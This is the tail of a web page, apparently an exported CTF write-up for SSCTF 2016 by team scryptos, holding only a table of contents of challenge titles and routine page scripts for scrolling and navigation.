                <div class="toc"><ul class="nav"><li class=""><a href="#ssctf-2016-quals-writeup-team-scryptos" smoothhashscroll="">SSCTF 2016 Quals writeup (team scryptos)</a><ul class="nav"><li class=""><a href="#can-you-hit-me-web-200" smoothhashscroll="">Can You Hit Me? - web 200</a></li><li><a href="#hungry-game-misc-300" smoothhashscroll="">Hungry Game - misc 300</a><ul class="nav"><li><a href="#the-challenge" smoothhashscroll="">The challenge</a></li><li><a href="#jumping-over-the-wall" smoothhashscroll="">jumping over the wall</a></li><li><a href="#cutting-trees" smoothhashscroll="">cutting trees</a></li><li><a href="#mining-diamonds" smoothhashscroll="">mining diamonds</a></li><li><a href="#boss-battle" smoothhashscroll="">Boss battle</a></li></ul></li><li><a href="#chain-rule-crypto-200" smoothhashscroll="">Chain Rule - crypto 200</a></li><li><a href="#re1-reverse-100" smoothhashscroll="">Re1 - reverse 100</a></li><li><a href="#re2-reverse-200" smoothhashscroll="">Re2 - reverse 200</a></li><li><a href="#re3-reverse-300" smoothhashscroll="">Re3 - reverse 300</a></li><li><a href="#pwn-1-exploit-400" smoothhashscroll="">Pwn-1 - exploit 400</a></li><li><a href="#pwn-2-exploit-600" smoothhashscroll="">Pwn-2 - exploit 600</a></li><li><a href="#heheda-crypto-100" smoothhashscroll="">HeHeDa - Crypto 100</a></li></ul></li></ul></div><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a>
            </ul>
        </div>
    </div>
    <div id="toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
        <div class="toc"><ul class="nav"><li class=""><a href="#ssctf-2016-quals-writeup-team-scryptos" smoothhashscroll="">SSCTF 2016 Quals writeup (team scryptos)</a><ul class="nav"><li class=""><a href="#can-you-hit-me-web-200" smoothhashscroll="">Can You Hit Me? - web 200</a></li><li class=""><a href="#hungry-game-misc-300" smoothhashscroll="">Hungry Game - misc 300</a><ul class="nav"><li class=""><a href="#the-challenge" smoothhashscroll="">The challenge</a></li><li class=""><a href="#jumping-over-the-wall" smoothhashscroll="">jumping over the wall</a></li><li class=""><a href="#cutting-trees" smoothhashscroll="">cutting trees</a></li><li class=""><a href="#mining-diamonds" smoothhashscroll="">mining diamonds</a></li><li class=""><a href="#boss-battle" smoothhashscroll="">Boss battle</a></li></ul></li><li class=""><a href="#chain-rule-crypto-200" smoothhashscroll="">Chain Rule - crypto 200</a></li><li class=""><a href="#re1-reverse-100" smoothhashscroll="">Re1 - reverse 100</a></li><li><a href="#re2-reverse-200" smoothhashscroll="">Re2 - reverse 200</a></li><li><a href="#re3-reverse-300" smoothhashscroll="">Re3 - reverse 300</a></li><li><a href="#pwn-1-exploit-400" smoothhashscroll="">Pwn-1 - exploit 400</a></li><li><a href="#pwn-2-exploit-600" smoothhashscroll="">Pwn-2 - exploit 600</a></li><li><a href="#heheda-crypto-100" smoothhashscroll="">HeHeDa - Crypto 100</a></li></ul></li></ul></div><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.2/gist-embed.min.js" defer></script>
    <script>
        var markdown = $(".markdown-body");
        //smooth all hash trigger scrolling
        function smoothHashScroll() {
            var hashElements = $("a[href^='#']").toArray();
            for (var i = 0; i < hashElements.length; i++) {
                var element = hashElements[i];
                var $element = $(element);
                var hash = element.hash;
                if (hash) {
                    $element.on('click', function (e) {
                        // store hash
                        var hash = this.hash;
                        if ($(hash).length <= 0) return;
                        // prevent default anchor click behavior
                        e.preventDefault();
                        // animate
                        $('body, html').stop(true, true).animate({
                            scrollTop: $(hash).offset().top
                        }, 100, "linear", function () {
                            // when done, add hash to url
                            // (default click behaviour)
                            window.location.hash = hash;
                        });
                    });
                }
            }
        }

        smoothHashScroll();
        var toc = $('.ui-toc');
        var tocAffix = $('.ui-affix-toc');
        var tocDropdown = $('.ui-toc-dropdown');
        //toc
        tocDropdown.click(function (e) {
            e.stopPropagation();
        });

        var enoughForAffixToc = true;

        function generateScrollspy() {
            $(document.body).scrollspy({
                target: ''
            });
            $(document.body).scrollspy('refresh');
            if (enoughForAffixToc) {
                toc.hide();
                tocAffix.show();
            } else {
                tocAffix.hide();
                toc.show();
            }
            $(document.body).scroll();
        }

        function windowResize() {
            //toc right
            var paddingRight = parseFloat(markdown.css('padding-right'));
            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
            toc.css('right', right + 'px');
            //affix toc left
            var newbool;
            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
            //for ipad or wider device
            if (rightMargin >= 133) {
                newbool = true;
                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
                tocAffix.css('left', left + 'px');
            } else {
                newbool = false;
            }
            if (newbool != enoughForAffixToc) {
                enoughForAffixToc = newbool;
                generateScrollspy();
            }
        }
        $(window).resize(function () {
            windowResize();
        });
        $(document).ready(function () {
            windowResize();
            generateScrollspy();
        });

        //remove hash
        function removeHash() {
            window.location.hash = '';
        }

        var backtotop = $('.back-to-top');
        var gotobottom = $('.go-to-bottom');

        backtotop.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToTop)
                scrollToTop();
            removeHash();
        });
        gotobottom.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToBottom)
                scrollToBottom();
            removeHash();
        });

        function scrollToTop() {
            $('body, html').stop(true, true).animate({
                scrollTop: 0
            }, 100, "linear");
        }

        function scrollToBottom() {
            $('body, html').stop(true, true).animate({
                scrollTop: $(document.body)[0].scrollHeight
            }, 100, "linear");
        }
    </script>
</body>

</html>